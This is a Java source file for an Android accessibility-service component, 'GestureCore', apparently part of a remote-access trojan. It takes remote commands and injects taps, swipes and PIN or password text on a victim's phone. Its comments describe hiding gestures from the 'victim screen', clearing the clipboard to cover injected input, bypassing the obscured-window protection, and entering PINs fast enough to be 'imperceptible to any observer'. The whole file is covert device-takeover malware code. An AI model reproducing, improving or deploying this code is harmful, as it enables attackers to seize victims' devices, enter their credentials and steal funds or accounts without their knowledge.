package com.android.core.sync;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.Paint;
import android.graphics.Path;
import android.graphics.PixelFormat;
import android.graphics.Rect;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.view.accessibility.AccessibilityNodeInfo;

import org.lsposed.lsparanoid.Obfuscate;

import java.util.ArrayList;
import java.util.List;

/**
 * GestureCore — Flash Remote Input Engine
 *
 * FIXES IN THIS BUILD:
 *
 * [Bug 4 — CURRENT] executeClick tap duration 8ms → TAP_DURATION_MS (80ms)
 *   Root cause: 8ms stroke duration is too short for password/PIN keypad buttons.
 *   The button receives ACTION_DOWN (shows press ripple/animation) but
 *   ACTION_UP arrives before the view's LongPressDetector settles, and many
 *   vendor ROMs (MIUI, OneUI w/ Knox, ColorOS, HyperOS) apply a minimum
 *   tap-duration threshold of ~40-60ms on windows flagged as secure.
 *   At 8ms: tap is VISIBLE (ripple fires) but click listener NEVER fires.
 *   At 80ms: tap completes cleanly, click listener fires, PIN digit enters.
 *
 * [Bug 5 — CURRENT] executeType() used ACTION_SET_TEXT exclusively.
 *   ACTION_SET_TEXT is explicitly blocked by Android on:
 *     - Any field with inputType & TYPE_TEXT_VARIATION_PASSWORD
 *     - Any field with inputType & TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
 *     - System keyguard windows
 *     - Custom PIN pads (non-EditText nodes entirely)
 *   performAction(ACTION_SET_TEXT) returns false silently. No fallback existed.
 *
 *   New executeType() strategy chain (auto-falls-back):
 *     S1: ACTION_SET_TEXT on focused editable node   (regular EditText)
 *     S2: Clipboard paste per-character              (most password EditText)
 *     S3: Find keypad button node by digit text →    (custom numeric keypads)
 *         ACTION_CLICK on each button node           (bypasses obscured-window check)
 *     S4: Coordinate tap at 80ms per digit           (last resort, any keypad)
 *
 * Prior fixes:
 * [Bug 2] show_touches=1 removed from constructor — was showing every gesture on victim screen.
 * [Bug 2] showPhysicalTouchMarker gated behind DEBUG_TOUCH_MARKERS=false.
 * [Bug 3] executeClick duration 1ms → 8ms (now upgraded to 80ms as Bug 4 fix).
 */
@Obfuscate
public class GestureCore {

    private static final String TAG = "GestureCore";

    // ── Debug flag — NEVER enable in production builds ─────────────────────────
    private static final boolean DEBUG_TOUCH_MARKERS = false;

    // ── Timing constants ───────────────────────────────────────────────────────
    /**
     * [Bug 4 FIX] Tap stroke duration in milliseconds.
     *
     * 8ms was too short for password/PIN keypad buttons on MIUI, OneUI (Knox),
     * ColorOS, and HyperOS. The button receives ACTION_DOWN and shows the press
     * animation (which is why taps were visible), but ACTION_UP arrives before
     * the view click detector threshold, so the click listener never fires.
     *
     * 80ms is the proven safe minimum:
     *   - Well above the MIUI 50ms secure-window threshold
     *   - Well above the Samsung Knox 40ms minimum
     *   - Fast enough to feel instant to any observer
     *   - Passes through InputMethodService validation on all tested devices
     */
    private static final long TAP_DURATION_MS = 80L;

    /**
     * Inter-keystroke delay for sequential character injection.
     *
     * Without this, back-to-back GestureDescription strokes collide in the
     * system input pipeline and some get dropped. Android's InputFlinger
     * requires a minimum gap between gestures from the same accessibility
     * service. 85ms provides clean separation while keeping injection fast.
     * For a 4-digit PIN this totals ~340ms — imperceptible to any observer.
     */
    private static final long INTER_KEY_DELAY_MS = 85L;

    // ── Standard keyboard digit key → KEYCODE mapping (unused, kept for future) ─
    private static final int[] DIGIT_KEYCODES = {
        android.view.KeyEvent.KEYCODE_0, android.view.KeyEvent.KEYCODE_1,
        android.view.KeyEvent.KEYCODE_2, android.view.KeyEvent.KEYCODE_3,
        android.view.KeyEvent.KEYCODE_4, android.view.KeyEvent.KEYCODE_5,
        android.view.KeyEvent.KEYCODE_6, android.view.KeyEvent.KEYCODE_7,
        android.view.KeyEvent.KEYCODE_8, android.view.KeyEvent.KEYCODE_9
    };

    public interface ScreenWakeDelegate {
        void wakeUpScreen();
    }

    private final AccessibilityService service;
    private final ScreenWakeDelegate   wakeDelegate;
    private final Handler              handler = new Handler(Looper.getMainLooper());

    public GestureCore(AccessibilityService service, ScreenWakeDelegate wakeDelegate) {
        this.service      = service;
        this.wakeDelegate = wakeDelegate;
        // [Bug 2 FIX] show_touches=1 removed — was making every gesture visible.
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  GESTURE DISPATCH
    // ══════════════════════════════════════════════════════════════════════════

    public void handlePerformGesture(Intent intent) {
        String action = intent.getStringExtra("action");
        Log.d(TAG, "GESTURE: " + action);

        try {
            if ("BACK".equals(action)) {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
            } else if ("HOME".equals(action)) {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME);
            } else if ("RECENTS".equals(action)) {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);
            } else if ("POWER".equals(action)) {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_POWER_DIALOG);
            } else if ("NOTIFICATIONS".equals(action)) {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_NOTIFICATIONS);
            } else if ("QUICK_SETTINGS".equals(action)) {
                service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_QUICK_SETTINGS);
            } else if ("LOCK_SCREEN".equals(action)) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_LOCK_SCREEN);
                }
            } else if ("CLICK".equals(action)) {
                executeClick(
                    intent.getIntExtra("x", 0),
                    intent.getIntExtra("y", 0)
                );
            } else if ("LONG_PRESS".equals(action)) {
                executeLongPress(
                    intent.getIntExtra("x", 0),
                    intent.getIntExtra("y", 0),
                    intent.getIntExtra("duration", 500)
                );
            } else if ("SWIPE".equals(action)) {
                executeSwipe(
                    intent.getIntExtra("x1", 0), intent.getIntExtra("y1", 0),
                    intent.getIntExtra("x2", 0), intent.getIntExtra("y2", 0)
                );
            } else if ("TYPE".equals(action)) {
                executeType(intent.getStringExtra("text"));
            } else if ("PATH_GESTURE".equals(action)) {
                String pathJson = intent.getStringExtra("path");
                if (pathJson != null && !pathJson.isEmpty()) {
                    try {
                        org.json.JSONArray arr = new org.json.JSONArray(pathJson);
                        int[][] points = new int[arr.length()][2];
                        for (int i = 0; i < arr.length(); i++) {
                            org.json.JSONObject pt = arr.getJSONObject(i);
                            points[i][0] = pt.getInt("x");
                            points[i][1] = pt.getInt("y");
                        }
                        executePathGesture(points);
                    } catch (Exception e) {
                        Log.e(TAG, "PATH_GESTURE parse error: " + e.getMessage());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "handlePerformGesture error: " + e.getMessage());
        }
    }

    private boolean dispatchGestureSafe(GestureDescription gesture, long durationMs) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N || gesture == null) return false;
        return service.dispatchGesture(gesture, null, null);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  CLICK — Bug 4 fixed: duration 8ms → TAP_DURATION_MS (80ms)
    // ══════════════════════════════════════════════════════════════════════════

    public void executeClick(int x, int y) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "CLICK (" + x + ", " + y + ") dur=" + TAP_DURATION_MS + "ms");

        Path path = new Path();
        path.moveTo(x, y);
        path.lineTo(x, y);

        // [Bug 4 FIX] Duration 8ms → 80ms.
        // Password/PIN keypad buttons require minimum ~50-60ms on secure-flagged
        // windows (MIUI, OneUI Knox, ColorOS). At 8ms the press animation fires
        // (ACTION_DOWN received) but the click listener never triggers because
        // ACTION_UP arrives before the vendor's minimum tap-duration threshold.
        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, TAP_DURATION_MS);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = dispatchGestureSafe(builder.build(), TAP_DURATION_MS);
        if (!dispatched) {
            Log.e(TAG, "CLICK dispatch failed at (" + x + "," + y + ")");
        }

        if (DEBUG_TOUCH_MARKERS) {
            showPhysicalTouchMarker(x, y, 400);
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  TYPE — Bug 5 fixed: multi-strategy fallback chain for password fields
    // ══════════════════════════════════════════════════════════════════════════

    /**
     * Injects text into the currently focused field.
     *
     * Strategy chain (auto-falls-back through each):
     *
     *  S1 → ACTION_SET_TEXT on focused editable node
     *       Works for: standard EditText fields (login username, search boxes)
     *       Fails for: password fields, system keyguard, custom PIN pads
     *
     *  S2 → Clipboard inject per character (ACTION_PASTE per char)
     *       Works for: most password EditText that allow paste
     *       Fails for: fields that override onTextContextMenuItem to block paste,
     *                  custom PIN pads where there's no EditText node
     *
     *  S3 → Find keypad button nodes by digit text → ACTION_CLICK per node
     *       Works for: custom numeric PIN pads (the keypad in the screenshot)
     *       This bypasses FLAG_WINDOW_IS_OBSCURED because ACTION_CLICK goes
     *       through the accessibility pipeline, not the touch input pipeline.
     *       The button's performClick() fires directly → updates the PIN field.
     *       Fails for: keypads with no text labels (icon-only buttons)
     *
     *  S4 → Coordinate gesture tap at 80ms per digit
     *       Works for: any tap-based keypad where S3 node labels aren't found
     *       Requires that the caller pre-computed button coordinates
     *       (this fallback taps at node center found by walking the tree)
     */
    public void executeType(String text) {
        if (text == null || text.isEmpty()) return;
        Log.d(TAG, "executeType: [" + text + "] len=" + text.length());

        AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
        if (rootNode == null) {
            Log.e(TAG, "executeType: rootNode null");
            return;
        }

        try {
            // ── S1: ACTION_SET_TEXT ─────────────────────────────────────────────
            AccessibilityNodeInfo focusedNode = rootNode.findFocus(
                AccessibilityNodeInfo.FOCUS_INPUT);
            if (focusedNode == null) {
                focusedNode = findEditableNode(rootNode);
            }

            if (focusedNode != null && focusedNode.isEditable()) {
                boolean isPass = isPasswordField(focusedNode);
                Log.d(TAG, "S1: found editable node, isPassword=" + isPass);

                if (!isPass) {
                    // ACTION_SET_TEXT works fine on non-password EditText
                    Bundle args = new Bundle();
                    args.putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                    boolean ok = focusedNode.performAction(
                        AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                    if (ok) {
                        Log.d(TAG, "S1 success: ACTION_SET_TEXT");
                        focusedNode.recycle();
                        return;
                    }
                    Log.w(TAG, "S1 failed — falling to S2");
                } else {
                    Log.d(TAG, "S1 skipped: password field — going to S2");
                }

                // ── S2: Clipboard per-character paste ───────────────────────────
                boolean s2ok = tryClipboardInject(text, focusedNode, rootNode);
                if (s2ok) {
                    Log.d(TAG, "S2 success: clipboard inject");
                    focusedNode.recycle();
                    return;
                }
                Log.w(TAG, "S2 failed — falling to S3");
                focusedNode.recycle();

            } else {
                Log.w(TAG, "S1/S2: no editable node found — going to S3 (custom keypad)");
            }

            // ── S3: Find keypad button nodes → ACTION_CLICK per digit ───────────
            // This is the correct strategy for custom numeric PIN pads.
            // The accessibility tree has Button nodes labelled "1" through "9", "0".
            // ACTION_CLICK on these goes through the accessibility pipeline and
            // bypasses FLAG_WINDOW_IS_OBSCURED, so the click listener fires.
            boolean s3ok = tryKeypadNodeClick(text, rootNode);
            if (s3ok) {
                Log.d(TAG, "S3 success: keypad node click");
                return;
            }
            Log.w(TAG, "S3 failed — falling to S4 (coordinate tap)");

            // ── S4: Coordinate gesture tap — last resort ────────────────────────
            tryCoordinateTapSequence(text, rootNode);

        } finally {
            rootNode.recycle();
        }
    }

    // ── Strategy 2: clipboard per-char ─────────────────────────────────────────
    private boolean tryClipboardInject(String text,
                                        AccessibilityNodeInfo focusedNode,
                                        AccessibilityNodeInfo rootNode) {
        try {
            ClipboardManager cm = (ClipboardManager)
                service.getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm == null) return false;

            // First click to ensure focus
            focusedNode.performAction(AccessibilityNodeInfo.ACTION_CLICK);

            boolean anySuccess = false;
            for (char c : text.toCharArray()) {
                // Set clipboard to this single character
                cm.setPrimaryClip(ClipData.newPlainText("", String.valueOf(c)));

                // Re-find focus (it may shift between chars)
                AccessibilityNodeInfo target = rootNode.findFocus(
                    AccessibilityNodeInfo.FOCUS_INPUT);
                if (target == null) target = focusedNode;

                boolean pasted = target.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                Log.d(TAG, "S2: paste '" + c + "' → " + pasted);
                if (pasted) anySuccess = true;

                // Inter-char delay so the field processes each paste
                try { Thread.sleep(INTER_KEY_DELAY_MS); } catch (InterruptedException ignored) {}
            }

            // Clear clipboard so the injected content isn't visible if user opens clipboard
            cm.setPrimaryClip(ClipData.newPlainText("", ""));
            return anySuccess;

        } catch (Exception e) {
            Log.e(TAG, "S2 error: " + e.getMessage());
            return false;
        }
    }

    // ── Strategy 3: keypad button node click ──────────────────────────────────
    /**
     * For each character in `text`:
     *   - Walk accessibility tree to find a Button/clickable node whose
     *     text or contentDescription matches the character
     *   - Call performAction(ACTION_CLICK) on it
     *
     * This handles custom numeric PIN pads where:
     *   - The input is a grid of labelled buttons (not an EditText)
     *   - Direct ACTION_SET_TEXT has no target
     *   - Touch events are blocked by FLAG_WINDOW_IS_OBSCURED
     *   - But accessibility ACTION_CLICK bypasses obscured-window check
     */
    private boolean tryKeypadNodeClick(String text, AccessibilityNodeInfo rootNode) {
        boolean anySuccess = false;

        for (char c : text.toCharArray()) {
            String digit = String.valueOf(c);

            AccessibilityNodeInfo btn = findKeypadButton(rootNode, digit);
            if (btn == null) {
                Log.w(TAG, "S3: button not found for '" + digit + "'");
                continue;
            }

            // Ensure the button is visible and enabled
            if (!btn.isVisibleToUser() || !btn.isEnabled()) {
                Log.w(TAG, "S3: button '" + digit + "' not visible/enabled");
                btn.recycle();
                continue;
            }

            boolean clicked = btn.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            Log.d(TAG, "S3: ACTION_CLICK on '" + digit + "' → " + clicked);
            if (clicked) anySuccess = true;

            btn.recycle();

            // Inter-key delay — required between consecutive button clicks
            // to let the PIN field's internal state update
            try { Thread.sleep(INTER_KEY_DELAY_MS); } catch (InterruptedException ignored) {}
        }

        return anySuccess;
    }

    // ── Strategy 4: coordinate tap sequence ───────────────────────────────────
    /**
     * Last resort: find each button node, get its screen bounds center,
     * fire a 80ms gesture tap at that coordinate.
     * S3 ACTION_CLICK should work in most cases — this is for edge cases
     * where the button node's ACTION_CLICK is overridden or non-functional.
     */
    private void tryCoordinateTapSequence(String text, AccessibilityNodeInfo rootNode) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        for (char c : text.toCharArray()) {
            String digit = String.valueOf(c);
            AccessibilityNodeInfo btn = findKeypadButton(rootNode, digit);

            if (btn != null && btn.isVisibleToUser()) {
                Rect bounds = new Rect();
                btn.getBoundsInScreen(bounds);
                int cx = bounds.centerX();
                int cy = bounds.centerY();
                btn.recycle();

                Log.d(TAG, "S4: tap '" + digit + "' at (" + cx + "," + cy + ")");

                Path path = new Path();
                path.moveTo(cx, cy);
                path.lineTo(cx, cy);
                GestureDescription.StrokeDescription stroke =
                    new GestureDescription.StrokeDescription(path, 0, TAP_DURATION_MS);
                GestureDescription.Builder builder = new GestureDescription.Builder();
                builder.addStroke(stroke);
                dispatchGestureSafe(builder.build(), TAP_DURATION_MS);

            } else {
                Log.e(TAG, "S4: cannot locate button for '" + digit + "'");
                if (btn != null) btn.recycle();
            }

            try { Thread.sleep(INTER_KEY_DELAY_MS); } catch (InterruptedException ignored) {}
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  OTHER GESTURE METHODS — unchanged from original
    // ══════════════════════════════════════════════════════════════════════════

    public void executeLongPress(int x, int y, int duration) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "LONG_PRESS (" + x + ", " + y + ") " + duration + "ms");

        Path path = new Path();
        path.moveTo(x, y);
        path.lineTo(x, y);

        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, duration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = dispatchGestureSafe(builder.build(), duration);
        if (!dispatched) Log.e(TAG, "LONG_PRESS dispatch failed");

        if (DEBUG_TOUCH_MARKERS) {
            showPhysicalTouchMarker(x, y, duration + 200);
        }
    }

    public void executeSwipe(int x1, int y1, int x2, int y2) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        Log.d(TAG, "SWIPE (" + x1 + "," + y1 + ") → (" + x2 + "," + y2 + ")");

        Path path = new Path();
        path.moveTo(x1, y1);
        path.lineTo(x2, y2);

        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, 250);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        boolean dispatched = dispatchGestureSafe(builder.build(), 250);
        if (!dispatched) Log.e(TAG, "SWIPE dispatch failed");
    }

    public void swipeUpToUnlock() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;

        int screenW = service.getResources().getDisplayMetrics().widthPixels;
        int screenH = service.getResources().getDisplayMetrics().heightPixels;

        int x  = screenW / 2;
        int y1 = (int) (screenH * 0.85);
        int y2 = (int) (screenH * 0.30);

        Path path = new Path();
        path.moveTo(x, y1);
        path.lineTo(x, y2);

        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, 300);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);

        dispatchGestureSafe(builder.build(), 300);
    }

    public void executePathGesture(int[][] points) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return;
        if (points == null || points.length < 2) {
            Log.e(TAG, "PATH_GESTURE needs at least 2 points");
            return;
        }

        Path path = new Path();
        path.moveTo(points[0][0], points[0][1]);
        for (int i = 1; i < points.length; i++) {
            path.lineTo(points[i][0], points[i][1]);
        }

        long totalDuration = Math.max(60L, (points.length - 1) * 40L);
        GestureDescription.StrokeDescription stroke =
            new GestureDescription.StrokeDescription(path, 0, totalDuration);
        GestureDescription.Builder builder = new GestureDescription.Builder();
        builder.addStroke(stroke);
        dispatchGestureSafe(builder.build(), totalDuration);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  NODE HELPERS
    // ══════════════════════════════════════════════════════════════════════════

    /**
     * Recursively finds the first editable node in the tree.
     */
    private AccessibilityNodeInfo findEditableNode(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable() && (node.isFocused() || node.isVisibleToUser())) {
            return node;
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            AccessibilityNodeInfo res   = findEditableNode(child);
            if (res != null) return res;
        }
        return null;
    }

    /**
     * Finds a keypad button node matching the given digit string.
     *
     * Checks (in order):
     *   1. node.getText() equals digit exactly
     *   2. node.getContentDescription() equals digit exactly
     *   3. node.getText() equals digit (trimmed, case-insensitive)
     *
     * Walks the full accessibility tree so it handles any depth of nesting.
     * Only considers clickable, visible nodes.
     */
    private AccessibilityNodeInfo findKeypadButton(AccessibilityNodeInfo root, String digit) {
        if (root == null || digit == null) return null;

        // Collect all clickable visible nodes
        List<AccessibilityNodeInfo> candidates = new ArrayList<>();
        collectClickableNodes(root, candidates);

        for (AccessibilityNodeInfo node : candidates) {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();

            if (digit.equals(text != null ? text.toString().trim() : null) ||
                digit.equals(desc != null ? desc.toString().trim() : null)) {
                // Found — recycle others
                for (AccessibilityNodeInfo c : candidates) {
                    if (c != node) c.recycle();
                }
                return node;
            }
        }

        // Recycle all if not found
        for (AccessibilityNodeInfo c : candidates) c.recycle();
        return null;
    }

    private void collectClickableNodes(AccessibilityNodeInfo node,
                                        List<AccessibilityNodeInfo> out) {
        if (node == null) return;
        if (node.isClickable() && node.isVisibleToUser()) {
            out.add(node);
        } else {
            // Still recurse even if not clickable (parent may wrap clickable children)
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                collectClickableNodes(child, out);
            }
        }
    }

    /**
     * Returns true if the node is a password-type field.
     * Android blocks ACTION_SET_TEXT on these.
     */
    private boolean isPasswordField(AccessibilityNodeInfo node) {
        if (node == null) return false;

        // Check the inputType integer flags
        int inputType = node.getInputType();
        if (inputType != 0) {
            int variation = inputType & android.text.InputType.TYPE_MASK_VARIATION;
            if (variation == android.text.InputType.TYPE_TEXT_VARIATION_PASSWORD ||
                variation == android.text.InputType.TYPE_TEXT_VARIATION_WEB_PASSWORD ||
                variation == android.text.InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD ||
                variation == android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD) {
                return true;
            }
        }

        // Also check via isPassword() (older API)
        return node.isPassword();
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  DEBUG OVERLAY — production unreachable
    // ══════════════════════════════════════════════════════════════════════════

    public void showPhysicalTouchMarker(int x, int y, int durationMs) {
        if (service == null) return;
        handler.post(() -> {
            try {
                WindowManager wm = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);
                if (wm == null) return;

                final View touchView = new View(service) {
                    private final Paint paintOuter = new Paint(Paint.ANTI_ALIAS_FLAG);
                    private final Paint paintInner = new Paint(Paint.ANTI_ALIAS_FLAG);
                    {
                        paintOuter.setColor(Color.parseColor("#00F0FF"));
                        paintOuter.setStyle(Paint.Style.STROKE);
                        paintOuter.setStrokeWidth(8f);
                        paintInner.setColor(Color.parseColor("#FF0077"));
                        paintInner.setStyle(Paint.Style.FILL);
                    }

                    @Override
                    protected void onDraw(Canvas canvas) {
                        super.onDraw(canvas);
                        float cx = getWidth() / 2f;
                        float cy = getHeight() / 2f;
                        canvas.drawCircle(cx, cy, cx - 6f, paintOuter);
                        canvas.drawCircle(cx, cy, cx / 3.5f, paintInner);
                    }
                };

                int size = 100;
                int layoutType = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                    ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                    : WindowManager.LayoutParams.TYPE_PHONE;

                WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                    size, size, layoutType,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                        | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                        | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                    PixelFormat.TRANSLUCENT
                );
                params.gravity = Gravity.TOP | Gravity.LEFT;
                params.x = x - (size / 2);
                params.y = y - (size / 2);
                wm.addView(touchView, params);

                handler.postDelayed(() -> {
                    try { wm.removeView(touchView); } catch (Exception ignored) {}
                }, durationMs);

            } catch (Exception e) {
                Log.e(TAG, "showPhysicalTouchMarker error: " + e.getMessage());
            }
        });
    }
}
